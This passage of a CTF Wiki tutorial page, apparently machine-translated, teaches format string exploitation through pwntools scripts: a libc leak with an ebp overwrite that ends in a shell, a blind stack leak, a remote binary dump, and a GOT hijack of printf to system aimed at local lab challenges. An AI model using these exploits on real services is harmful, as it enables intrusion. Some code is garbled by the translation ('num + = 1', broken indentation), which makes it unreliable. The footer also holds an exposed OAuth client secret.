<span class="n">libc_start_main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">241</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get libc_start_main addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_start_main</span><span class="p">))</span>

<span class="n">libc_base</span><span class="o">=</span><span class="n">libc_start_main</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="p">]</span>

<span class="n">system</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>

<span class="n">binsh</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;system: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;binsh: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>



<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%6$p%11$pccc&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;bbbb&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;dddd&quot;</span>

<span class="n">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">printcontact</span> <span class="p">(</span><span class="n">I</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;Description:&amp;#39;)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ccc&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">data</span>

<span class="n">ebp_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">12</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;ebp: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;heap: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>



<span class="n">part1</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>

<span class="n">part2</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">part1</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%6$n&#39;</span>



<span class="c1">#payload=fmtstr_payload(6,{ebp_addr:heap_addr})</span>

<span class="c1">##print payload</span>

<span class="n">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s1">&#39;3333&#39;</span><span class="p">,</span> <span class="s1">&#39;123456789&#39;</span><span class="p">,</span> <span class="s1">&#39;300&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">printcontact</span> <span class="p">(</span><span class="n">I</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;Description:&amp;#39;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;Description:&amp;#39;)</span>
<span class="c1">##gdb.attach(sh)</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;get shell&quot;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
<span class="c1">##get shell</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="c1">#39;5&amp;#39;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
</code></pre></div></p>
<p>It should be noted that this does not stabilize the shell because we have entered a string that is too long. But we have no way to control the address we want to enter in the front. It can only be this way.</p>
<p>Why do you need to print so much? Because the format string is not on the stack, even if we get the address of the ebp that needs to be changed, there is no way to write this address to the stack, use the $ symbol to locate him; because there is no way to locate, there is no way to use l \ll and other ways to write this address, so only print a lot.</p>
<h2 id="format-string-blind-hit">Format string blind hit<a class="headerlink" href="#format-string-blind-hit" title="Permanent link">&para;</a></h2>
<h3 id="principle_4">Principle<a class="headerlink" href="#principle_4" title="Permanent link">&para;</a></h3>
<p>The so-called format string blind typing means that only the interactive ip address and port are given. The corresponding binary file is not given to let us perform pwn. In fact, this is similar to BROP, but BROP uses stack overflow, and here We are using a format string vulnerability. In general, we follow the steps below</p>
<ul>
<li>Determine the number of bits in the program</li>
<li>Identify the location of the vulnerability
-Use</li>
</ul>
<p>Since I didn&#39;t find the source code after the game, I simply constructed two questions.</p>
<h3 id="example-1-leaking-stack">Example 1 - Leaking Stack<a class="headerlink" href="#example-1-leaking-stack" title="Permanent link">&para;</a></h3>
<p>Both the source and deployment files are placed in the corresponding folder [fmt_blind_stack] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack</a>).</p>
<h4 id="determine-the-number-of-programs">Determine the number of programs<a class="headerlink" href="#determine-the-number-of-programs" title="Permanent link">&para;</a></h4>
<p>We randomly entered %p and the program echoed the following information.</p>
<div class="highlight"><pre><span></span><code>➜  blind_fmt_stack git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>

%p

0x7ffd4799beb0

G�flag is on the stack%                          
</code></pre></div>
<p>Tell us that the flag is on the stack and that the program is 64-bit and that there should be a format string vulnerability.</p>
<h4 id="use">Use<a class="headerlink" href="#use" title="Permanent link">&para;</a></h4>
<p>Then let&#39;s take a little test and see</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>





<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">):</span>

        <span class="nb">print</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>





<span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%</span><span class="si">{}</span><span class="s1">$p&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="n">leak</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div>
<p>Finally, I simply looked at the output and got the flag.</p>
<div class="highlight"><pre><span></span><code>////////

////////

<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span>ff
flag <span class="o">{</span>exam
s_is_fla

g<span class="o">}</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span>

<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span>fe<span class="se">\x</span>7f<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span>
</code></pre></div>
<h3 id="example-2-blind-hijacking-got">Example 2 - Blind hijacking got<a class="headerlink" href="#example-2-blind-hijacking-got" title="Permanent link">&para;</a></h3>
<p>The source code and deployment files are already in the <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_got">blind_fmt_got</a> folder.</p>
<h4 id="determine-the-number-of-programs_1">Determine the number of programs<a class="headerlink" href="#determine-the-number-of-programs_1" title="Permanent link">&para;</a></h4>
<p>By simply testing, we found that this program is a format string vulnerability function, and the program is 64-bit.</p>
<div class="highlight"><pre><span></span><code>➜  blind_fmt_got git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>

%p

0x7fff3b9774c0
</code></pre></div>
<p>This time, I didn&#39;t show it back. I tried it again and found that there was nothing wrong with it. Then we had to leak a wave of source programs.</p>
<h4 id="determining-the-offset_2">Determining the offset<a class="headerlink" href="#determining-the-offset_2" title="Permanent link">&para;</a></h4>
<p>Before the leak procedure, we still have to determine the offset of the format string, as follows</p>
<div class="highlight"><pre><span></span><code>➜  blind_fmt_got git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>

aaaaaaaa%p%p%p%p%p%p%p%p%p

aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
</code></pre></div>
<p>Based on this, we can know that the starting address offset of the format string is 6.</p>
<h4 id="leaking-binary">leaking binary<a class="headerlink" href="#leaking-binary" title="Permanent link">&para;</a></h4>
<p>Since the program is 64-bit, we started leaking from 0x400000. In general, blind typing with a format string vulnerability can be read into the &#39;\x00&#39; character, otherwise it can&#39;t be revealed how to play, after that, the output must be truncated by &#39;\x00&#39;, this is because The output functions of the format string exploit are truncated by &#39;\x00&#39;. . So we can use the leak code below.</p>
<div class="highlight"><pre><span></span><code><span class="c1">##coding=utf8</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>



<span class="c1">##context.log_level = &#39;debug&#39;</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>





<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>

    <span class="c1"># leak addr for three times</span>

<span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>

        <span class="k">try</span><span class="p">:</span>

            <span class="nb">print</span> <span class="s1">&#39;leak addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>

            <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

            <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%00008$s&#39;</span> <span class="o">+</span> <span class="s1">&#39;STARTEND&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>

<span class="c1">#说明有\n, a new line appears</span>
            <span class="k">if</span> <span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>

                <span class="k">return</span> <span class="kc">None</span>

            <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

            <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;STARTEND&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

            <span class="k">return</span> <span class="n">data</span>

        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>

<span class="n">num</span> <span class="o">+</span> <span class="o">=</span> <span class="mi">1</span>
            <span class="k">continue</span>

    <span class="k">return</span> <span class="kc">None</span>



<span class="k">def</span> <span class="nf">getbinary</span><span class="p">():</span>

    <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;binary&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0x401000</span><span class="p">:</span>

        <span class="n">data</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>

            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="p">)</span>

            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">elif</span> <span class="nb">len</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>

            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">else</span><span class="p">:</span>

            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">addr</span> <span class="o">+</span> <span class="o">=</span> <span class="nb">len</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">getbinary</span><span class="p">()</span>
</code></pre></div>
<p>It should be noted that in the payload, it is necessary to judge whether or not &#39;\n&#39; appears, because this will cause the source program to read only the previous content, and there is no way to leak the memory, so it is necessary to skip such an address.</p>
<h4 id="ary">分析斌ary<a class="headerlink" href="#ary" title="Permanent link">&para;</a></h4>
<p>Use IDA to open the leaked binary, change the program base address, and then simply look at it, you can basically determine the address of the source program main function.</p>
<p><code>`</code>asm
seg000:00000000004005F6                 push    rbp</p>
<p>seg000:00000000004005F7                 mov     rbp, rsp</p>
<p>seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h</p>
<p>seg000:00000000004005FE</p>
<p>seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j</p>
<p>seg000:00000000004005FE                 lea     rax, [rbp-80h]</p>
<p>seg000:0000000000400602                 mov     edx, 80h ; '€'</p>
<p>seg000:0000000000400607                 mov     rsi, rax</p>
<p>seg000: 000000000040060A mov edi, 0
seg000:000000000040060F                 mov     eax, 0</p>
<p>seg000:0000000000400614                 call    sub_4004C0</p>
<p>seg000:0000000000400619                 lea     rax, [rbp-80h]</p>
<p>seg000: 000000000040061D mov rdi, rax
seg000:0000000000400620                 mov     eax, 0</p>
<p>seg000:0000000000400625                 call    sub_4004B0</p>
<p>seg000:000000000040062A                 mov     rax, cs:601048h</p>
<p>seg000: 0000000000400631 mov rdi, rax
seg000:0000000000400634                 call    near ptr unk_4004E0</p>
<p>seg000:0000000000400639                 jmp     short loc_4005FE</p>
<div class="highlight"><pre><span></span><code>It can be basically determined that sub\_4004C0 is a read function, because the read function has a total of three parameters, which is basically read. In addition, the sub\_4004B0 called below should be the output function, and then a function should be called again, and then jump back to the read function, the program should be a while 1 loop, always executing.


#### Using ideas


After analyzing the above, we can determine the following basic ideas


- leak the address of the printf function,
- Get the corresponding libc and system function address
- Modify printf address to system function address
- Read /bin/sh; to get the shell


#### Using the program


The procedure is as follows.

```python

##coding=utf8

import math

from pwn import *

from LibcSearcher import LibcSearcher

##context.log_level = &#39;debug&#39;

context.arch = &#39;amd64&#39;

ip = &quot;127.0.0.1&quot;

port = 9999





def leak(addr):

    # leak addr for three times

num = 0
    while num &lt; 3:

        try:

            print &#39;leak addr: &#39; + hex(addr)

            sh = remote(ip, port)

            payload = &#39;%00008$s&#39; + &#39;STARTEND&#39; + p64(addr)

#说明有\n, a new line appears
            if &#39;\x0a&#39; in payload:

                return None

            sh.sendline(payload)

            data = sh.recvuntil(&#39;STARTEND&#39;, drop=True)

            sh.close()

            return data

        except Exception:

num + = 1
            continue

    return None





def getbinary():

    addr = 0x400000

    f = open(&#39;binary&#39;, &#39;w&#39;)

    while addr &lt; 0x401000:

        data = leak(addr)

        if data is None:

            f.write(&#39;\xff&#39;)

            addr += 1

elif len (data) == 0:
            f.write(&#39;\x00&#39;)

            addr += 1

        else:

            f.write(data)

addr + = len (data)
    f.close()





##getbinary()

read_got = 0x601020

printf_got = 0x601018

sh = remote(ip, port)

## let the read get resolved

sh.sendline(&#39;a&#39;)

sh.recv()

## get printf addr

payload = &#39;%00008$s&#39; + &#39;STARTEND&#39; + p64(read_got)

sh.sendline(payload)

data = sh.recvuntil (&amp;#39;STARTEND&amp;#39;, drop = True) .ljust (8, &amp;#39;x00&amp;#39;)
sh.recv()

read_addr = u64(data)



## get system addr

libc = LibcSearcher(&#39;read&#39;, read_addr)

libc_base = read_addr - libc.dump(&#39;read&#39;)

system_addr = libc_base + libc.dump(&#39;system&#39;)

log.success(&#39;system addr: &#39; + hex(system_addr))

log.success(&#39;read   addr: &#39; + hex(read_addr))

## modify printf_got

payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size=&#39;short&#39;)

## get all the addr

addr = payload[:32]

payload = &#39;%32d&#39; + payload[32:]

offset = (int)(math.ceil(len(payload) / 8.0) + 1)

for i in range(6, 10):

    old = &#39;%{}$&#39;.format(i)

    new = &#39;%{}$&#39;.format(offset + i)

    payload = payload.replace(old, new)

remainer = len(payload) % 8

payload += (8 - remainer) * &#39;a&#39;

payload += addr

sh.sendline(payload)

sh.recv()



## get shell

sh.sendline(&#39;/bin/sh;&#39;)

sh.interactive()
</code></pre></div>
<p>What needs to be noted here is this code.</p>
<div class="highlight"><pre><span></span><code><span class="c1">## modify printf_got</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">},</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>

<span class="c1">## get all the addr</span>

<span class="n">addr</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%32d</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">[</span><span class="mi">32</span><span class="p">:]</span>

<span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>

    <span class="n">old</span> <span class="o">=</span> <span class="s1">&#39;%</span><span class="si">{}</span><span class="s1">$&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="n">new</span> <span class="o">=</span> <span class="s1">&#39;%</span><span class="si">{}</span><span class="s1">$&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">old</span><span class="p">,</span> <span class="n">new</span><span class="p">)</span>

<span class="n">remainer</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">remainer</span><span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">addr</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</code></pre></div>
<p>Fmtstr_payload directly get the payload will put the address in front, and this will lead to &#39;\x00&#39; truncation of printf (<strong>About this problem, pwntools is currently developing an enhanced version of fmt_payload, it is estimated that it will be developed soon </strong>). So I used some tricks to put it behind. The main idea is to place the address in the 8 byte alignment and modify the offset in the payload. have to be aware of is</p>
<div class="highlight"><pre><span></span><code><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</code></pre></div>
<p>This line gives the offset of the modified address in the formatted string. The reason for this is that no matter how it is modified, the more characters in the order of &#39;%order$hn&#39; will not be greater than 8. Specific can be deduced by yourself.</p>
<h3 id="title">Title<a class="headerlink" href="#title" title="Permanent link">&para;</a></h3>
<ul>
<li>SuCTF2018 - lock2 (The organizer provided the docker image: suctf/2018-pwn-lock2)</li>
</ul>
                
              
              
                <!-- Set from config but allow override -->
   

<hr>
<blockquote class="page-copyright">
    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
</blockquote>
<!-- Comments Integration -->
 
<h2 id="__comments">评论</h2>
<form id="gitalk-form" onsubmit="return false;">
    <div id="gitalk-container"></div>
</form>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: 'd78d2e8d782d95560289',
        clientSecret: '954f1e7f8ae9b2566272a2105fe8df60b50e8e9b',
        repo: 'comment',
        owner: 'ctf-wiki',
        admin: ['40huo', 'iromise'],
        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script> 
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2016 - 2020 CTF Wiki Team
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/vendor.a018d6bb.min.js"></script>
      <script src="../../../../assets/javascripts/bundle.4b42b5e6.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../../../..",
          features: ['tabs'],
          search: Object.assign({
            worker: "../../../../assets/javascripts/worker/search.4ac00218.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
      
        <script src="../../../../_static/js/extra.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
        <script src="../../../../search/main.js"></script>
      
    
  </body>
</html>